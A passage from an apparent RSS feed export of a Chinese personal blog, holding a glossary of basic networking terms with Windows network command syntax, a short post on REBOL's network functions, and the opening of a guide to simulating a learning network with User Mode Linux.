<![CDATA[术语解释：计算机网络　Internet　Intranet　TCP/IP　IP地址　网关　DOMAIN　主机　域名　DNS　WWW　EMAIL　FTP　Telnet　URL　HTML　主页　浏览器　搜索引擎　下载　计算机病毒　计算机木马　垃圾邮件　防火墙　JAVA　网络电话<br><br>常用网络命令: arp　finger　ftp　nbtstat　netstat　ping　route　tftp　tracert<br>什么是计算机网络<br><br>　　计算机网络，它是指利用通信线路连接起来的、相互独立的计算机的集合。这包含两个概念：首先，这些计算机之间必须存在通信线路；其次，这些计算机必须相互独立。从这个定义出发，传统的主机/终端式系统就不能算是严格意义上的计算机网络。<br>　　按地理位置划分，计算机网络可分为四种：网际网、广域网(WAN)、城域网(MAN)和局域网(LAN)。 Internet就是世界上最大的网际网，另外还存在其他网际网类型，它们通常连接着处于同一大洲或同一地域范围的多个国家；广域网一般指连接一个国家的各个地区的网络，分布距离一般在100到1000公里之间；城域网又称都市网，它的覆盖范围一般为一个城市，方圆不超过10到几十公里；局域网的地理分布则相对较小，例如建筑物或一般学校等。<br>　　计算机网络的传输速率通常以每秒钟传输的数据位来计算。从传输速度看，局域网的通信率是最高的，例如以太网的速率一般为10Mbps，快速以太网为 100Mbps；城域网的速度低于局域；网际网的速度则相对更低。通信线路及联人网络的计算机结合在一起的总体布局模型称为网络拓朴。按网络拓朴划分，计算机网络可分为总线网络、环网、星形网和混合网络等。局域网中最常用的以太网是典型的总线网络。（返回）<br>什么是Internet<br><br>　　Internet是一个由各种不同类型和规模的独立运行与管理的计算机网络组成的全球范围的计算机网络。组成Internet的计算机网络包括局域网（LAN)、城域网（MAN)以及大规模的广域网（WAN)等。这些网络通过普通电话、高速率专用线路、卫星、微波和光缆等通讯线路把不同国家的大学、公司、科研机构以及军事和政治等组织的网络连接起来。Internet网络互连采用的基本协议是TCP/IP。（返回）<br>什么是Intranet<br><br>　　Intranet指采用Internet技术建立的企业内部专用网络。它以TCP/IP协议作为基础，以Web为核心应用，构成统一和便利的信息交换平台。（返回）<br>什么是TCP/IP<br><br>　　TCP/IP（传输控制协议/网间协议）是一种网络通信协议，它规范了网络上的所有通信设备，尤其是一个主机与另一个主机之间的数据往来格式以及传送方式。TCP/IP是INTERNET的基础协议，也是一种电脑数据打包和寻址的标准方法。在数据传送中，可以形象地理解为有两个信封，TCP和IP就像是信封，要传递的信息被划分成若干段，每一段塞入一个TCP信封，并在该信封面上记录有分段号的信息，再将TCP信封塞入IP大信封，发送上网。在接受端，一个TCP软件包收集信封，抽出数据，按发送前的顺序还原，并加以校验，若发现差错，TCP将会要求重发。因此，TCP/IP在INTERNET中几乎可以无差错地传送数据。对普通用户来说，并不需要了解网络协议的整个结构，仅需了解IP的地址格式，即可与世界各地进行网络通信。（返回）<br>什么是IP地址<br><br>　　为了使Internet上的众多电脑主机在通信时能够相互识别，Internet上的每一台主机都分配有一个唯一的32位地址，该地址称为IP地址，也称作网际地址。IP地址由4个数组成，每个数可取值0～255，各数之间用一个点号“.”分开（如：202.103.8.46）。事实上，每个IP地址都是由网络号和主机号两部分组成的。网络号表明主机所联接的网络，主机号标识了该网络上特定的那台主机。如：上例中202.103是网络号，8.46是主机号。（返回）<br>什么是域名<br><br>　　IP地址是以数字来代表的主机地址，比较难记。为了使用和记忆方便，也为了便于网络地址的分层管理和分配，INTERNET在1984年采用了域名管理系统（DOMAIN NAME SYSTEM），入网的每台主机都具有类似于下列结构的域名：主机号.机构名.网络名.最高层域名 。域名用一组简短的英文表达，比用数字表达的IP地址容易记忆。例如：北京电报局的一台与INTERNET联网的电脑主机的IP地址是 202.96.0.97，域名为PUBLIC.BTA.NET.CN。加入INTERNET的各级网络依照域名管理系统的命名规则对本网内的主机命名和分配网内主机号，并负责完成通信时域名到IP地址的转换。对使用者来说，我们一般不需要使用IP地址，而直接使用域名，INTERNET上的服务系统自动地转为IP类型的地址。（返回）<br>什么是HTML<br><br>　　HTML（HyperTextMark-upLanguage）即超文本标记语言，是WWW的描述语言。设计HTML语言的目的是为了能把存放在一台电脑中的文本或图形与另一台电脑中的文本或图形方便地联系在一起，形成有机的整体，人们不用考虑具体信息是在当前电脑上还是在网络的其它电脑上。我们只需使用鼠标在某一文档中点取一个图标，Internet就会马上转到与此图标相关的内容上去，而这些信息可能存放在网络的另一台电脑中。HTML文本是由 HTML命令组成的描述性文本，HTML命令可以说明文字、图形、动画、声音、表格、链接等。HTML的结构包括头部（Head）、主体（Body）两大部分，其中头部描述浏览器所需的信息，而主体则包含所要说明的具体内容。（返回）<br>什么是HomePage（主页）<br><br>　　HomePage是一种用超文本标记语言（描述性语言），由它将信息组织好，再经过相应的解释器或浏览器翻译出的包括文字、图象、声音、动画等多种信息组织方式。（返回）<br>什么是JAVA<br><br>　　Java是Sun公司推出的一种编程语言。它是一种通过解释方式来执行的语言，语法规则和C++类似。同时，Java也是一种跨平台的程序设计语言。用 Java语言编写的程序叫做“Applet”（小应用程序），用编译器将它编译成类文件后，将它存在WWW页面中，并在HTML档上作好相应标记，用户端只要装上Java的客户软件就可以在网上直接运行“Applet”。Java非常适合于企业网络和Internet环境，现在已成为Internet中最受欢迎、最有影响的编程语言之一。 Java有许多值得称道的优点，如简单、面向对象、分布式、解释性、可靠、安全、结构中立性、可移植性、高性能、多线程、动态性等。Java摈弃了C++ 中各种弊大于利的功能和许多很少用到的功能。Jave可以运行与任何微处理器，用Java开发的程序可以在网络上传输，并运行于任何客户机上。 （返回）<br>什么是WWW<br><br>　　WWW（World Wide Web）是一种建立在Internet上的全球性、交互性的动态、多平台、分布式、图形信息系统，它只是建立在Internet上的一种网络服务。其最初开发的目的是为了在科学家之间共享成果，科学家们可以将科研成果以图文形式在网上进行共享，它最基本的概念就是Hypertext（超文本）。现在WWW 的应用已远远超出了原设想，成为Internet上最受欢迎的应用之一，它的出现极大地推动了Internet的推广。（返回）<br>什么是Browser（浏览器）<br><br>　　WWW服务和Gopher服务是通过客户端程序访问的，这种程序被称为Browser（浏览器),　因为它允许用户根据超文本链接(HyperText 　Link）进行漫游，而不必进行有目的的查询。浏览器鼓励偶然的发现，并因此而得名。Windows系统自带的浏览器为Microsoft(微软)公司的Internet Explorer。（返回）<br>什么是EMAIL<br><br>　　Email是Internet上的重要信息服务方式，它为世界各地的Internet用户提供了一种极为快速、简便和经济的通信以及交换信息的方法。Email地址是以域为基础的地址，Email的传递是一个标准化的简单邮件传输协议SMTP来完成的（返回）。<br>什么是计算机病毒<br><br>　　计算机病毒，是指编制或者在计算机程序中插入的破坏计算机功能或者毁坏数据，影响计算机使用，并能自我复制的一组计算机指令或者程序代码。（返回）<br>什么是计算机木马<br><br>　　全称“特洛伊木马(Trojan Horse)”，原指古希腊士兵藏在木马内进入敌方城市从而占领敌方城市的故事。在Internet上，“特洛伊木马”指的是一种经过伪装的欺骗性程序，它通过将自身伪装吸引用户下载执行，从而破坏或窃取使用者的重要文件和资料。（返回）<br>什么是Domain(域)<br><br>　　Domain(域)指某一类Internet主机。一些重要的域包括：.COM(商业机构)，.EDU(教育org组织机构)等，.GOV(政府部门)，和.MIL(军事机构)。大部分国家也拥有自己独立的域，例如　.US(美国)，.UK((英国)，.CN(中国)，.JP(日本)等等。（返回）<br>什么是Host（主机）<br><br>　　Host（主机）是在Internet上具有固定IP地址的计算机，在其上建立服务器端软件后可以向远程Internet用户发布信息或传送数据.（返回）<br>什么是DNS<br>　　域名管理系统DNS（Domain Name System）是域名解析服务器的意思.它在互联网的作用是：把域名转换成为网络可以识别的ip地址。比如：我们上网时输入的www.sohu.com会自动转换成为61.135.132.6 （返回）<br>什么是FTP(文件传输)<br><br>　　文件传输协议FTP(File Transfer Protocol)是Internet传统的服务之一。FTP使用户能在两个联网的计算机之间传输文件，它是Internet传递文件最主要的方法。使用匿名(Anonymous)FTP， 用户可以免费获取Internet丰富的资源。除此之外，FTP还提供登录、目录查询、文件操作及其他会话控制功能。（返回）<br>什么是URL<br><br>　　URL（Uniform Resoure Locator：统一资源定位器）是WWW页的地址，它从左到右由：<br>　　Internet资源类型（scheme）：指出WWW客户程序用来操作的工具。如“http：//”表示WWW服务器，“ftp：//”表示FTP服务器。<br>　　服务器地址（host）：指出WWW页所在的服务器域名。<br>　　端口（port）：对某些资源的访问来说，需给出相应的服务器提供端口号。<br>　　路径（path）：指明服务器上某资源的位置，通常有目录/子目录/文件名这样结构组成。<br>　　URL地址格式排列为：scheme：//host：port/path，例如http：//www.sohu.com/domain/HXWZ就是一个典型的URL地址。其中PORT和PATH部分并不总是需要的。（返回）<br>什么是Search Engine(搜索引擎)<br><br>　　Search Engine(搜索引擎)是WWW环境中的信息检索系统，是使用World Wide Web查找信息不可缺少的工具，有Internet导航台之称，它包括目录服务和关键字检索两种服务方式。（返回）<br>什么是Download(下载)<br><br>　　Download (下载)是指从远程主机上拷贝文字,图片，声音等信息或者软件到本地硬盘上。（返回）<br>什么是垃圾邮件<br><br>　　垃圾邮件是指与内容无关，而且收件人并没有明确要求接受该邮件的发送给多个收件人的信件或张贴物。也可以是发送给与信件主题不相关的新闻组或者列表服务器的同一信件的重复张贴物。在因特网上的其它常见词汇是UCE（Unsolicited Commercial Email，不请自来的商业电子邮件）和 UBE（Unsolicited Bulk Email，不请自来的批量电子邮件），他们与通常所称的垃圾邮件是一样的。（返回）<br>什么是Internet Phone（Internet电话）<br><br>　　Internet Phone（Internet电话）指通过 Internet传输交互语音的应用和软件，它可以从数量级上减少长途电话尤其是国际长途电话的费用。这种技术最早由一家以色列电子公司VocalTec 推出。目前最先进的　　Internet电话已经在话音质量，话音数据完整性，响应延迟和使用方便性等方面接近实用水平。（返回）<br>什么是Telnet(Telnet远程登录)<br><br>　　Telnet是进行远程登录的标准协议和主要方式它为用户提供了在本地计算机上完成远程主机工作的能力。通过使用Telnet,Internet用户可以与全世界许多信息中心图书馆及其它信息资源联系。Telnet远程登录的使用主要有两种情况。第一种是用户在远程主祝上有自己的帐号 (Account)，即用户拥有注册的用户名和口令；第二种是许多Internet主机为用户提供了某种形式的公共Telnet信息资源，这种资源对于每一个Telnet用户都是开放的。（返回）<br>什么是Firework（防火墙）<br><br>　　Firework(防火墙)是加强加Internet 与 Intranet（内部网）之间安全防范的一个或一组系统。防火墙可以确定哪些内部服务允许外部访问，哪些外人被许可访问所允许的内部服务，田些外部服务可由内部人员访问。为了使防火墙发挥效力，来自和发往Internet的所有信息都必须经由防火墙出入。防火墙只允许授权信息通过，而防火墙本身不能被渗透。（返回）<br>什么是Gateway（网关）<br><br>　　Gateway(网关)以及Gatebridge(网桥)均指不同网络之间的通讯接口设备和程序，只不过两者针对的网络层次不同。现在Internet技术上越来越少用这两个词汇，而由Router(路由器)统指此类接口设备和程序。（返回）<br>Arp<br><br>显示和修改“地址解析协议”(ARP) 所使用的到以太网的 IP 或令牌环物理地址翻译表。该命令只有在安装了 TCP/IP 协议之后才可用。<br>arp -a [inet_addr] [-N [if_addr]]<br>arp -d inet_addr [if_addr]<br>arp -s inet_addr ether_addr [if_addr]<br>参数<br>-a 通过询问 TCP/IP 显示当前 ARP 项。如果指定了 inet_addr，则只显示指定计算机的 IP 和物理地址。<br>-g 与 -a 相同。<br>inet_addr 以加点的十进制标记指定 IP 地址。<br>-N 显示由 if_addr 指定的网络界面 ARP 项。<br>if_addr 指定需要修改其地址转换表接口的 IP 地址（如果有的话）。如果不存在，将使用第一个可适用的接口。<br>-d 删除由 inet_addr 指定的项。<br>-s 在 ARP 缓存中添加项，将 IP 地址 inet_addr 和物理地址 ether_addr 关联。物理地址由以连字符分隔的 6 个十六进制字节给定。<br>使用带点的十进制标记指定 IP 地址。项是永久性的，即在超时到期后项自动从缓存删除。（返回）<br>ether_addr 指定物理地址。<br>Finger<br><br>在运行 Finger 服务的指定系统上显示有关用户的信息。根据远程系统输出不同的变量。该命令只有在安装了 TCP/IP 协议之后才可用。<br>finger [-l] [user]@computer[...]<br>参数<br>-l 以长列表格式显示信息。<br>user 指定要获得相关信息的用户。省略用户参数以显示指定计算机@computer上所有用户的信息（返回）<br>Ftp<br><br>将文件传送到正在运行 FTP 服务的远程计算机或从正在运行 FTP 服务的远程计算机传送文件（有时称作 daemon）。Ftp 可以交互使用。单击“相关主题”列表中的“ftp 命令”以获得可用的“ftp”子命令描述。该命令只有在安装了 TCP/IP 协议之后才可用。Ftp 是一种服务，一旦启动，将创建在其中可以使用 ftp 命令的子环境，通过键入 quit 子命令可以从子环境返回到 Windows 2000 命令提示符。当 ftp 子环境运行时，它由 ftp 命令提示符代表。<br>ftp [-v] [-n] [-i] [-d] [-g] [-s:filename] [-a] [-w:windowsize] [computer]<br>参数<br>-v 禁止显示远程服务器响应。<br>-n 禁止自动登录到初始连接。<br>-i 多个文件传送时关闭交互提示。<br>-d 启用调试、显示在客户端和服务器之间传递的所有 ftp 命令。<br>-g 禁用文件名组，它允许在本地文件和路径名中使用通配符字符（* 和 ?）。（请参阅联机“命令参考”中的 glob 命令。）<br>-s: filename 指定包含 ftp 命令的文本文件；当 ftp 启动后，这些命令将自动运行。该参数中不允许有空格。使用该开关而不是重定向 (&gt; )。<br>-a 在捆绑数据连接时使用任何本地接口。<br>-w:windowsize 替代默认大小为 4096 的传送缓冲区。<br>computer 指定要连接到远程计算机的计算机名或 IP 地址。如果指定，计算机必须是行的最后一个参数。（返回）<br>Nbtstat<br><br>该诊断命令使用 NBT（TCP/IP 上的 NetBIOS）显示协议统计和当前 TCP/IP 连接。该命令只有在安装了 TCP/IP 协议之后才可用。<br>nbtstat [-a remotename] [-A IP address] [-c] [-n] [-R] [-r] [-S] [-s] [interval]<br>参数<br>-a remotename 使用远程计算机的名称列出其名称表。<br>-A IP address 使用远程计算机的 IP 地址并列出名称表。<br>-c 给定每个名称的 IP 地址并列出 NetBIOS 名称缓存的内容。<br>-n 列出本地 NetBIOS 名称。“已注册”表明该名称已被广播 (Bnode) 或者 WINS（其他节点类型）注册。<br>-R 清除 NetBIOS 名称缓存中的所有名称后，重新装入 Lmhosts 文件。<br>-r 列出 Windows 网络名称解析的名称解析统计。在配置使用 WINS 的 Windows 2000 计算机上，此选项返回要通过广播或 WINS 来解析和注册的名称数。<br>-S 显示客户端和服务器会话，只通过 IP 地址列出远程计算机。<br>-s 显示客户端和服务器会话。尝试将远程计算机 IP 地址转换成使用主机文件的名称。<br>interval 重新显示选中的统计，在每个显示之间暂停 interval 秒。按 CTRL+C 停止重新显示统计信息。如果省略该参数，nbtstat 打印一次当前的配置信息。（返回）<br>Netstat<br><br>显示协议统计和当前的 TCP/IP 网络连接。该命令只有在安装了 TCP/IP 协议后才可以使用。<br>netstat [-a] [-e] [-n] [-s] [-p protocol] [-r] [interval]<br>参数<br>-a 显示所有连接和侦听端口。服务器连接通常不显示。<br>-e 显示以太网统计。该参数可以与 -s 选项结合使用。<br>-n 以数字格式显示地址和端口号（而不是尝试查找名称）。<br>-s 显示每个协议的统计。默认情况下，显示 TCP、UDP、ICMP 和 IP 的统计。-p 选项可以用来指定默认的子集。<br>-p protocol 显示由 protocol 指定的协议的连接；protocol 可以是 tcp 或 udp。如果与 -s 选项一同使用显示每个协议的统计，protocol 可以是 tcp、udp、icmp 或 ip。<br>-r 显示路由表的内容。<br>interval 重新显示所选的统计，在每次显示之间暂停 interval 秒。按 CTRL+B 停止重新显示统计。如果省略该参数，netstat 将打印一次当前的配置信息。（返回）<br>Ping<br><br>验证与远程计算机的连接。该命令只有在安装了 TCP/IP 协议后才可以使用。<br>ping [-t] [-a] [-n count] [-l length] [-f] [-i ttl] [-v tos] [-r count] [-s count] [[-j computer-list] | [-k computer-list]] [-w timeout] destination-list<br>参数<br>-t Ping 指定的计算机直到中断。<br>-a 将地址解析为计算机名。<br>-n count 发送 count 指定的 ECHO 数据包数。默认值为 4。<br>-l length 发送包含由 length 指定的数据量的 ECHO 数据包。默认为 32 字节；最大值是 65,527。<br>-f 在数据包中发送“不要分段”标志。数据包就不会被路由上的网关分段。<br>-i ttl 将“生存时间”字段设置为 ttl 指定的值。<br>-v tos 将“服务类型”字段设置为 tos 指定的值。<br>-r count 在“记录路由”字段中记录传出和返回数据包的路由。count 可以指定最少 1 台，最多 9 台计算机。<br>-s count 指定 count 指定的跃点数的时间戳。<br>-j computer-list 利用 computer-list 指定的计算机列表路由数据包。连续计算机可以被中间网关分隔（路由稀疏源）IP 允许的最大数量为 9。<br>-k computer-list 利用 computer-list 指定的计算机列表路由数据包。连续计算机不能被中间网关分隔（路由严格源）IP 允许的最大数量为 9。<br>-w timeout 指定超时间隔，单位为毫秒。<br>destination-list 指定要 ping 的远程计算机。（返回）<br>Route<br><br>控制网络路由表。该命令只有在安装了 TCP/IP 协议后才可以使用。<br>route [-f] [-p] [command [destination] [mask subnetmask] [gateway] [metric costmetric]]<br>参数<br>-f 清除所有网关入口的路由表。如果该参数与某个命令组合使用，路由表将在运行命令前清除。<br>-p 该参数与 add 命令一起使用时，将使路由在系统引导程序之间持久存在。默认情况下，系统重新启动时不保留路由。与 print 命令一起使用时，显示已注册的持久路由列表。忽略其他所有总是影响相应持久路由的命令。<br>command 指定下列的一个命令。 print 打印路由 ;add 添加路由 ;delete 删除路由 ;change 更改现存路由<br>destination 指定发送 command 的计算机。<br>mask subnetmask 指定与该路由条目关联的子网掩码。如果没有指定，将使用 255.255.255.255。<br>gateway 指定网关<br>名为 Networks 的网络数据库文件和名为 Hosts 的计算机名数据库文件中均引用全部 destination 或 gateway 使用的符号名称。如果命令是 print 或 delete，目标和网关还可以使用通配符，也可以省略网关参数。<br>metric costmetric 指派整数跃点数（从 1 到 9999）在计算最快速、最可靠和（或）最便宜的路由时使用。（返回）<br>Tftp<br><br>将文件传输到正在运行 TFTP 服务的远程计算机或从正在运行 TFTP 服务的远程计算机传输文件。该命令只有在安装了 TCP/IP 协议后才可以使用。<br>tftp [-i] computer [get | put] source [destination]<br>参数<br>-i 指定二进制图像传送模式（也称为“八位字节”）。在二进制图像模式中，文件一个字节接一个字节地逐字移动。在传送二进制文件时使用该模式。如果省略了 -i，文件将以 ASCII 模式传送。这是默认的传送模式。此模式将 EOL 字符转换为 UNIX 的回车符和个人计算机的回车符/换行符。在传送文本文件时应使用此模式。如果文件传送成功，将显示数据传输率。<br>computer 指定本地或远程计算机。<br>put 将本地计算机上的文件 destination 传送到远程计算机上的文件 source。<br>get 将远程计算机上的文件 destination 传送到本地计算机上的文件 source。<br>如果将本地计算机上的文件 file-two 传送到远程计算机上的文件 file-one，请指定 put。如果将远程计算机上的文件 file-two 传送到远程计算机上的文件 file-one，请指定 get。 因为 tftp 协议不支持用户身份验证，所以用户必须登录，并且文件在远程计算机上必须可以写入。<br>source 指定要传送的文件。如果本地文件指定为 -，则远程文件在 stdout 上打印出来（如果获取），或从 stdin（如果放置）读取。<br>destination 指定将文件传送到的位置。如果省略了 destination，将假定与 source 同名。（返回）<br>Tracert<br><br>该诊断实用程序将包含不同生存时间 (TTL) 值的 Internet 控制消息协议 (ICMP) 回显数据包发送到目标，以决定到达目标采用的路由。要在转发数据包上的 TTL 之前至少递减 1，必需路径上的每个路由器，所以 TTL 是有效的跃点计数。数据包上的 TTL 到达 0 时，路由器应该将“ICMP 已超时”的消息发送回源系统。Tracert 先发送 TTL 为 1 的回显数据包,并在随后的每次发送过程将 TTL 递增 1，直到目标响应或 TTL 达到最大值，从而确定路由。路由通过检查中级路由器发送回的“ICMP 已超时”的消息来确定路由。不过，有些路由器悄悄地下传包含过期 TTL 值的数据包，而 tracert 看不到。<br>tracert [-d] [-h maximum_hops] [-j computer-list] [-w timeout] target_name<br>参数<br>/d 指定不将地址解析为计算机名。<br>-h maximum_hops 指定搜索目标的最大跃点数。<br>-j computer-list 指定沿 computer-list 的稀疏源路由。<br>-w timeout 每次应答等待 timeout 指定的微秒数。<br>target_name 目标计算机的名称。（返回）]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372008414104653438/</guid>
    </item>
    <item>
      <title>
<![CDATA[REBOL的网络功能]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200845101630758/</link>
      <description>
<![CDATA[<p>Ftp的验证采取<a rel="nofollow" href="ftp://user:pass@url/"  >ftp://user:pass@url</a>的方式</p> <p>SMTP的验证没有看到，但是好像这里的网络竟然不用SMTP验证。</p> <p>一个验证方法，因为这里的防火墙，所以还没尝试。</p> <p>set-net [hankjin@163.com smtp.163.com pop3.163.com none<br>&nbsp;&nbsp;&nbsp; none none "hankjin" "password"]<br>send <a rel="nofollow" href="mailto:jindongh@cn.ibm.com"  >jindongh@cn.ibm.com</a> "This is from 163.com"</p> <p>顺便看看一些缩略词的全称：</p> <p>DNS - Domain Name Service<br>TCP - Transmission Control Protocol<br>UDP - User Datagram Protocol<br>HTTP - Hyper Text Transfer Protocol<br>FTP - File Transfer Protocol<br>SMTP - Simple Mail Transport Protocol<br>POP - Post Office Protocol<br>NNTP - Network News Transfer Protocol<br>CGI - Common Gateway Interface</p> <p>BBS - Bulletin Board System</p> <p><a rel="nofollow" href="http://www.rebol.com/docs/core23/rebolcore-13.html#section-3"  >http://www.rebol.com/docs/core23/rebolcore-13.html#section-3</a></p>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200845101630758/</guid>
    </item>
    <item>
      <title>
<![CDATA[单机搭建学习网络UserModeLinux]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201010129263187/</link>
      <description>
<![CDATA[如果163博客支持导入Word文档就好了<br>  <div style=""  >  <p style="text-align: center;"  align="center"  ><span style="font-size: 42pt;"  lang="EN-US"  >&nbsp;</span></p>  <p style="text-align: center;"  align="center"  ><span style="font-size: 42pt;"  lang="EN-US"  >&nbsp;</span></p>  <p style="text-align: center;"  align="center"  ><span style="font-size: 42pt;"  lang="EN-US"  >&nbsp;</span></p>  <p style="text-align: center;"  align="center"  ><b style=""  ><span style="font-size: 42pt; font-family: 宋体;"  >单机搭建学习网络</span></b><b style=""  ><span style="font-size: 42pt;"  lang="EN-US"  ></span></b></p>  <p style="text-align: center;"  align="center"  ><b style=""  ><span style="font-size: 42pt;"  lang="EN-US"  >User Mode Linux</span></b></p>  <p style="text-align: center;"  align="center"  ><b style=""  ><span style="font-size: 22pt;"  lang="EN-US"  >Version 1.0</span></b></p>  <p><span style="font-size: 12pt;"  lang="EN-US"  >&nbsp;</span></p>  <p><span style="font-size: 12pt;"  lang="EN-US"  >&nbsp;</span></p>  <p><span style="font-size: 12pt;"  lang="EN-US"  >&nbsp;</span></p>  <p><span style="font-size: 12pt;"  lang="EN-US"  >&nbsp;</span></p>  <p><span style="font-size: 12pt;"  lang="EN-US"  >&nbsp;</span></p>  <p><span style="font-size: 12pt;"  lang="EN-US"  >&nbsp;</span></p>  <p><span style="font-size: 12pt;"  lang="EN-US"  >&nbsp;</span></p>  <p><span style="font-size: 12pt;"  lang="EN-US"  >&nbsp;</span></p>  <p><span style="font-size: 12pt;"  lang="EN-US"  >&nbsp;</span></p>  <p style="text-align: center;"  align="center"  ><span style="font-size: 12pt;"  lang="EN-US"  >&nbsp;</span></p>  <p style="text-align: center;"  align="center"  ><span style="font-size: 12pt;"  lang="EN-US"  >&nbsp;</span></p>  <p style="text-align: center;"  align="center"  ><span style="font-size: 12pt;"  lang="EN-US"  >&nbsp;</span></p>  <p style="text-align: center;"  align="center"  ><span style="font-size: 12pt;"  lang="EN-US"  >&nbsp;</span></p>  <p style="text-align: center;"  align="center"  ><span style="font-size: 16pt;"  lang="EN-US"  >Copyleft@ysmonk</span></p>  <p style="text-align: center;"  align="center"  ><span style="font-size: 16pt;"  lang="EN-US"  >2010</span><span style="font-size: 16pt; font-family: 宋体;"  >年</span><span style="font-size: 16pt;"  lang="EN-US"  >1</span><span style="font-size: 16pt; font-family: 宋体;"  >月</span><span style="font-size: 16pt;"  lang="EN-US"  ></span></p>  </div>  <span style="font-size: 12pt; font-family: &quot;Times New Roman&quot;;"  lang="EN-US"  ><br style="page-break-before: always;"  clear="all"  > </span>  <div style=""  >  <p style="text-align: center;"  align="center"  ><span style="font-size: 12pt; font-family: 宋体;"  >目录</span><span style="font-size: 12pt;"  lang="EN-US"  ></span></p><span><span style=""  lang="EN-US"  ><a href="http://hankjin.blog.163.com/blog/#_Toc277360879"  ><span style="font-family: 宋体;"  lang="EN-US"  ><span lang="EN-US"  ></span></span><span style="color: windowtext; display: none; text-decoration: none;"  ><span style=""  >... </span></span><span style="color: windowtext; display: none; text-decoration: none;"  >12</span><span style="color: windowtext; display: none; text-decoration: none;"  ></span></a></span></span><span style=""  lang="EN-US"  ></span>    </div>  <span style="font-size: 10.5pt; font-family: &quot;Times New Roman&quot;;"  lang="EN-US"  >1&nbsp;&nbsp;&nbsp;&nbsp; 系统简介... 1<br>2&nbsp;&nbsp;&nbsp;&nbsp; 快速搭建... 2<br>2.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 准备工具和软件... 2<br>2.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 运行... 2<br>3&nbsp;&nbsp;&nbsp;&nbsp; 准备工作... 3<br>3.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 预备知识... 3<br>3.1.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; user-mode-linux. 3<br>3.1.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uml_net 3<br>3.1.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; screen命令... 3<br>3.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 安装软件... 3<br>3.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 制作文件系统... 3<br>4&nbsp;&nbsp;&nbsp;&nbsp; 开始搭建... 5<br>4.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 虚拟交换机... 5<br>4.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 定制文件系统... 5<br>4.2.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; serverA. 5<br>4.2.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; serverB. 5<br>4.2.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; clientA. 6<br>4.2.4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; clientB1. 6<br>4.2.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; clientB2. 6<br>4.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实现NAT. 7<br>4.3.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设置serverA. 7<br>4.3.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设置serverB. 7<br>4.3.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设置host 7<br>5&nbsp;&nbsp;&nbsp;&nbsp; 测试... 9<br>5.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 测试交换机... 9<br>5.1.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 测试switch1. 9<br>5.1.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 测试switchA. 9<br>5.1.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 测试switchB. 9<br>5.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 测试NAT. 9<br>5.2.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; clientA. 9<br>5.2.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; clientB. 10<br>5.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 高级测试... 10<br>5.3.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 测试VPN.. 10<br>6&nbsp;&nbsp;&nbsp;&nbsp; 常见错误<br style="page-break-before: always;"  clear="all"  > </span>  <div style=""  >  <h1><a name="_Toc277360846" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >1<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >系统简介</span></a></h1>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >如下图所示的网络环境</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >最少需要</span><span lang="EN-US"  >5</span><span style="font-family: 宋体;"  >台工作站才可以搭建起来</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >这给网络学习带来极大的障碍</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >但是利用</span><span lang="EN-US"  >User Mode Linux</span><span style="font-family: 宋体;"  >的特性</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >就可以在一台工作站上模拟出这个环境</span><span lang="EN-US"  >.</span></p>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >本文基于</span><span lang="EN-US"  >Ubuntu Intrepid</span><span style="font-family: 宋体;"  >环境</span><span lang="EN-US"  >.</span></p>  <p align="center"  ><span lang="EN-US"  ></span></p><div><img title="单机搭建学习网络UserModeLinux - hankjin - 云水居"  alt="单机搭建学习网络UserModeLinux - hankjin - 云水居"  style="margin: 0pt 10px 0pt 0pt;"  src="http://img233.ph.126.net/MSIp9C2Mez96suMbRM2C-A==/1755840904722992039.jpg"  ><span style="font-family: 宋体;"  ></span></div></div>  <span style="font-size: 10.5pt; font-family: &quot;Times New Roman&quot;;"  lang="EN-US"  > </span>  <div style=""  >  <h1><a name="_Toc277360847" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >2<span style="font: 7pt &quot;Times New Roman&quot;;"  